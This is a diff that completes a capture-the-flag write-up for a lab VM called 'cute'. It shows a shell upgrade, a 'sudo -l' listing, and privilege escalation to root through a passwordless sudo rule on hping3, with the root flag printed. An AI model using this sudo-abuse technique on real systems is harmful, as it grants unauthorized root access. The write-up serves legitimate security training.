@@ -503,6 +503,54 @@ We can upgrade to a proper shell with the help of `python3`
 python3 -c "import pty;pty.spawn('/bin/bash')"
 www-data@cute:/var/www/html/uploads$
 ```
-Searching around..
+The first flag (user's) is under /home/fox and its readablee by the current user.
 
-## To be continued..
+Now we must get root access to read the last root flag.
+
+Lets execute `sudo -l`
+```
+Matching Defaults entries for www-data on cute:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on cute:
+    (root) NOPASSWD: /usr/sbin/hping3
+```
+Now, simply executing `sudo hping3` will give us a limited root shell, that we can read the final flage from:
+```
+www-data@cute:/home/fox$ sudo hping3
+sudo hping3
+hping3> whoami
+whoami
+root
+hping3> cd /root
+cd /root
+hping3> ls
+ls
+localweb  root.txt
+hping3> cat root.txt
+cat root.txt
+0b18032c2d06d9e738ede9bc24795ff2
+hping3> 
+```
+If you want to drop in a normal root shell, you can simply execute `/bin/bash` inside `hping3's` shell:
+```
+hping3> /bin/bash
+/bin/bash
+root@cute:~# cd /root
+cd /root
+root@cute:~# ls -lart
+ls -lart
+total 36
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwxr-xr-x 18 root root 4096 Sep 17 17:19 ..
+-rw-------  1 root root   31 Sep 17 17:29 .mysql_history
+drwxr-xr-x  2 root root 4096 Sep 17 17:55 localweb
+-rw-------  1 root root   36 Sep 17 18:46 .lesshst
+-rw-------  1 root root   33 Sep 18 16:20 root.txt
+drwx------  3 root root 4096 Sep 18 17:25 .
+-rw-------  1 root root   76 Sep 18 17:36 .bash_history
+root@cute:~# 
+```
+## This concludes this vm. Hope that you enjoyed it.
